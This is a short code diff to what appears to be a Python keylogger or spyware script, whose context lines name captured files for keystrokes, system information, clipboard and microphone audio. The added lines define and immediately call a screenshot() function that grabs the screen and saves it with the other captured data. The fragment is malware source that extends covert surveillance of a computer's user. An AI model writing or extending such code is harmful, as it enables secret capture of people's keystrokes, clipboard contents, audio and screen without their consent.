@@ -37,6 +37,7 @@ key_info = "key_log.txt"
 sys_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
 audio_info = "audio.wav"
+screenshot_info = "screenshot.png"
 
 mic_time = 15
 
@@ -192,3 +193,12 @@ def microphone():
 
 
 microphone()
+
+# capturing screenshot
+
+def screenshot():
+    img = ImageGrab.grab()
+    img.save(file_path + extend + screenshot_info)
+    print("Screen Captured.")
+
+screenshot()
